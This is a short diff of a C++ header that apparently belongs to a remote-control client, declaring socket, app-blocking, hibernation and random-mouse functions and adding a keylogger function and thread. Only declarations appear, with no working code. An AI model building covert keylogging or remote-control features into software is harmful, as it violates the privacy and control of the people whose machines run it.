@@ -57,10 +57,12 @@ public:
 			const char* request, int bufferLenght = 512);
 	void Hibernation();
 	void RandMouse();
-	//void Keylogger();
+	void Keylogger(const char* fileName);
 
 };
 
 DWORD WINAPI ClientSocketThread(void* ClientSocket);
 DWORD WINAPI BlockAppsThread(void* arg);
+DWORD WINAPI KeyloggerThread(void* arg);
+
 #endif /* FUNCTIONS_H_ */
